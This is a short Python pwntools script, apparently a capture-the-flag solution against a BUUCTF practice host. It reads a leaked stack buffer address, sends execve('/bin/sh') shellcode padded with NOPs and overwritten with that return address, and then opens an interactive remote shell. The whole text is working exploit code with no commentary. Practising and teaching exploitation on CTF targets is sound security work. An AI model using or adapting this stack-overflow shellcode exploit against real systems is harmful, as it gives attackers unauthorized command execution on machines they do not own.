from pwn import *
r = remote('node3.buuoj.cn',29175)
shellcode =  '\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
print(disasm(shellcode))
r.recvuntil("[*]Location:")
buf_addr = int(r.recvuntil('\n',drop=True), 16)
payload = shellcode.ljust(0x28,'\x90') + p64(buf_addr)
r.recvuntil('[*]Command:')
r.sendline(payload)
r.interactive()
